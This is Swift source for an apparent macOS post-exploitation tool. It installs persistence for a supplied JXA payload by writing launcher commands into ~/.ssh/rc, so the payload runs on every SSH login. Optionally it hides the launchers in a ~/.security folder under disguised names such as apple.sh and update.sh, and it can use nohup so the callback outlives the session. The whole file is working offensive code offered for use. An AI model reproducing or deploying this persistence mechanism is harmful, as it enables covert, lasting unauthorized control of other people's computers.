import Foundation
import Cocoa

//Usage: ./SSHrcPersistence [path_to_jxa_payload] [yes/no]
//note: if you select "yes", the callback will only live as long as the ssh session lasts. However, if you select "no", the callback will run independently of the ssh session and continue even after the session closes

let scriptName = CommandLine.arguments[0]
let fileMan = FileManager.default
let uName = NSUserName()
let home = "/Users/\(uName)"
var isDir = ObjCBool(true)

if CommandLine.arguments.count != 3 {
    print("Usage: \(scriptName) [jxa_js_payload] [yes/no]")
    print("Note: yes/no indicates whether or not to use hidden files")
    print("exiting...")
    exit(0)
}
else {
    let payload_1 = CommandLine.arguments[1]
    let payload1 = "osascript \(payload_1)"
    let hidden = CommandLine.arguments[2]
    if fileMan.fileExists(atPath: payload_1){
        do {
            var payload2 =
            """
            cd ~/.security
            ./update.sh &
            """
            
            var profile = "\(home)/.security/apple.sh"
            var hiddenPath =  "\(home)/.security"
            
            if hidden == "y" || hidden == "Y" || hidden == "yes" || hidden == "Yes" || hidden == "YES"{
                if fileMan.fileExists(atPath: hiddenPath, isDirectory: &isDir){
                    var payloadPath = "\(home)/.security/apple.sh"
                    try payload2.write(toFile: payloadPath, atomically: true, encoding: .utf8)
                    
                    var persistPath = "\(home)/.security/update.sh"
                    try payload1.write(toFile: persistPath, atomically: true, encoding: .utf8)
                    
                    var attributes = [FileAttributeKey : Any]()
                    attributes[.posixPermissions] = 0o755
                    try fileMan.setAttributes(attributes, ofItemAtPath: payloadPath)
                    try fileMan.setAttributes(attributes, ofItemAtPath: persistPath)
                    
                    var profilePath = "\(home)/.ssh/rc"
                    try profile.write(toFile: profilePath, atomically: true, encoding: .utf8)
                    
                    print("[+] Persistence installed at \(home)/.ssh/rc, \(home)/.security/apple.sh, and \(home)/.security/update.sh")
                }
                else {
                    try fileMan.createDirectory(at: URL(fileURLWithPath: hiddenPath), withIntermediateDirectories: false, attributes: nil)
                    
                    var payloadPath = "\(home)/.security/apple.sh"
                    try payload2.write(toFile: payloadPath, atomically: true, encoding: .utf8)
                    
                    var persistPath = "\(home)/.security/update.sh"
                    try payload1.write(toFile: persistPath, atomically: true, encoding: .utf8)
                    
                    var attributes = [FileAttributeKey : Any]()
                    attributes[.posixPermissions] = 0o755
                    try fileMan.setAttributes(attributes, ofItemAtPath: payloadPath)
                    try fileMan.setAttributes(attributes, ofItemAtPath: persistPath)
                    
                    var profilePath = "\(home)/.ssh/rc"
                    try profile.write(toFile: profilePath, atomically: false, encoding: .utf8)
                    
                    print("[+] Persistence installed at \(home)/.ssh/rc, \(home)/.security/apple.sh, and \(home)/.security/update.sh")
                    
                    
                }
                
            }
            else {
                var profilePath = "\(home)/.ssh/rc"
                var payload3 =
                """
                nohup payload > /dev/null 2>&1&
                """
                
                var updatedPayload = payload3.replacingOccurrences(of: "payload", with: payload1)
                
                if !(fileMan.fileExists(atPath: profilePath)){
                    try updatedPayload.write(toFile: profilePath, atomically: true, encoding: .utf8)
                    print("[+] Persistence installed at \(home)/.ssh/rc")
                }
                else {
                    try updatedPayload.write(toFile: profilePath, atomically: false, encoding: .utf8)
                    print("[+] Persistence installed at \(home)/.ssh/rc")
                }
                
            }
            
            
            
        }
        catch let error {
            print(error)
        }
    }
    else {
        print("[-] Payload at \(payload1) not found. Exiting...")
        exit(0)
    }
    

    
}

